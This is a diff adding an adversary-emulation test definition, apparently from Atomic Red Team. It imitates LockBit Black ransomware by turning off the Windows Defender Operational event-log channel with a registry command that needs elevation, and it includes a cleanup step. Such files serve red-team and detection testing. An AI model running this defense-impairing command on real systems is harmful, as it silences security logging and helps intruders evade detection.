@@ -1,0 +1,33 @@
+- id: f6df0b8e-2c83-44c7-ba5e-0fa4386bec41
+  name: LockBit Black - Disable the ETW Provider of Windows Defender -cmd
+  description: 'An adversary can disable the ETW Provider of Windows Defender,
+
+    so nothing would be logged to Microsoft-Windows-Windows-Defender/Operational anymore.
+
+    https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a'
+  tactic: defense-impairment
+  technique:
+    attack_id: T1685
+    name: Disable or Modify Tools
+  platforms:
+    windows:
+      sh:
+        command: reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Windows
+          Defender/Operational" /v Enabled /t REG_DWORD /d 0 /f
+        cleanup: reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Windows
+          Defender/Operational" /v Enabled /f >nul 2>&1
+        elevation_required: true
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - atomic-red-team
+  - t1685
+  - defense-impairment
+  author: Atomic Red Team
+  additional_info:
+    technique_created: '2026-04-14T22:53:26.949Z'
+    atomic_guid: f6df0b8e-2c83-44c7-ba5e-0fa4386bec41
+    import_timestamp: '2026-05-02T05:00:41.652521Z'
